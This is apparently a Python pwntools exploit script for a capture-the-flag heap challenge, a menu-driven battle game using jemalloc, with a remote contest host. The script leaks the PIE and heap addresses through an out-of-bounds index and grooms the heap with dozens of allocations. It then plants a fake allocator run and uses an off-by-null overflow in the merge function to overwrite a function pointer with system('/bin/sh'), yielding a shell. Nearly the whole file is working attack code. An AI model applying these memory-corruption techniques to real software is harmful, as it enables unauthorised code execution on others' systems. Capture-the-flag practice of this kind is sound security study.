from pwn import * 

context.arch='amd64'
# context.log_level = 'debug'

def add(size, name):
	sla(">> ", '1')
	sla("nter the size : ", str(size))
	sla("nter name : ", name)

def battle(id):
	sla(">> ", '2')
	sla("nter enemy id : ", str(id))

def merga(id1, id2):
	sla(">> ", '3')
	sla("id 1:", str(id1))
	sla('id 2:', str(id2))

def kill(idx):
	for i in range(7):
		battle(idx)
	sl('1')


scanf = 0x0000000000001CDE
leak  = 0x0000000000001453
read  = 0x00000000000016D2
offbynull = 0x0000000000001804
strcat = 0x0000000000001999
getshell = 0x000000000001D32
bps = [offbynull, strcat, getshell]
pie = 1



def exp():
	sl("b"* 0x20)
	battle(-7)
	ru("Starting battle with ")
	leak = u64(re(6, 2).ljust(8, b'\x00'))
	PIE = leak - 0x4008
	print("leak pie: ")
	print(hex(PIE))
	slog['PIE'] = PIE 
	sl('2')
	# battle(-2)

	'''
	add(0x20, '1' * 0x20)
	for i in range(6):
		battle(0)
	
	battle(0)
	gdba()
	sl('1')
	'''

	add(0x60, '1' * 0x20) # 0
	add(0x60, '1' * 0x20) # 1

	kill(0)
	kill(1)

	add(0x20, '') # 2 
	battle(2)
	ru("Starting battle with ")
	leak = u64(re(6, 2).ljust(8, b'\x00'))
	heap = leak - 0xb00a
	print("leak heap: ")
	print(hex(heap))
	slog['heap'] = heap

	bin = 0x800d70 + heap 
	slog['bin'] = bin 

	add(0x20, 'a' * 0x20) # 3

	for i in range(6):
		battle(2)
	sl('1')

	kill(3)

	# add(0x20, '1' * 0x20) # 4 
	# add(0x20, '2' * 0x20) # 5 


	for i in range (61):
		add(0x40, 'a'*0x40)

	print("add 0x40 final")
	# 0xa7e0 0xa800 
	add(0x20, '/bin/sh\x00') # 65 
	binsh = heap + 0xa800 
	print("sedn binsh " + hex(binsh))


	# 0x820
	add(0x20, '2' * 0x20) # 66 
	# add(0x20, '3' * 0x20) # 67 
	payload = flat(0x00000000384adf93, bin, 0x0000003200000001, 0x0003ffffffffffff)
	print("send fake run")
	# paylaod = 'a' * 0x20 
	add(0x20, payload) # 67 
	add(0x20, '4' * 0x20) # 68 
	add(0x20, '5' * 0x20) # 69
	add(0x20, '6' * 0x20) # 70

	kill(66)
	kill(67)
	kill(68)
	kill(69)

	add(0x60, 'z' * 0x60) # 71
	print("heap fengshui final")

	add(0x20, '1' * 0x20) # 72 index2
	merga(70, 72)
	print("overflow")
	system = PIE + 0x000000000001170
	paylaod = flat(system , binsh)
	add(0x50, paylaod) # p_func
	print("get p_func")

	sl('4')

	'''
	add(0x20, '3'*0)
	battle(2)
	ru("Starting battle with ")
	leak = u64(re(6, 2).ljust(8, b'\x00'))
	target = leak - 0xa00a + 0x8060
	print(hex(target))
	slog['target'] = target 
	'''

	# for i in range(0x3e):
		# add(0x40, 'a' * 0x30)

	# gdba()
	# add(0x40, 'a' * 0x30)
	# b080





def gdba():
    if local == 0:
        return 0;
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base =int(os.popen("pmap {}|awk '{{print $1}}'".format(cn.pid)).readlines()[1],16)
        cmd +=''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd +='set $base={:#x}\n'.format(base)
        cmd +='set $list={:#x}\n'.format(base+0x0000000000004040)
        cmd += "b * malloc\n"
        cmd += 'b * arena_run_reg_alloc\n'
        cmd += "b * realloc\n"
        cmd += "b * free\n"
        cmd += "directory ./jemalloc-2.2.5/\n"
        slog['base'] = base	
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])
    gdb.attach(cn,cmd)

local = int(sys.argv[1])
slog = {'name' : 111}

if local:
    cn = process('./bin')
else:
    cn = remote("pwn.challenge.bi0s.in", 1230)

re  = lambda m, t : cn.recv(numb=m, timeout=t)
recv= lambda      : cn.recv()
ru  = lambda x    : cn.recvuntil(x)
rl  = lambda      : cn.recvline()
sd  = lambda x    : cn.send(x)
sl  = lambda x    : cn.sendline(x)
ia  = lambda      : cn.interactive()
sla = lambda a, b : cn.sendlineafter(a, b)
sa  = lambda a, b : cn.sendafter(a, b)
sll = lambda x    : cn.sendlineafter(':', x)
# after a, send b;


def slog_show():
    for i in slog:
        success(i + ' ==> ' + hex(slog[i]))

exp()

slog_show()

cn.interactive()


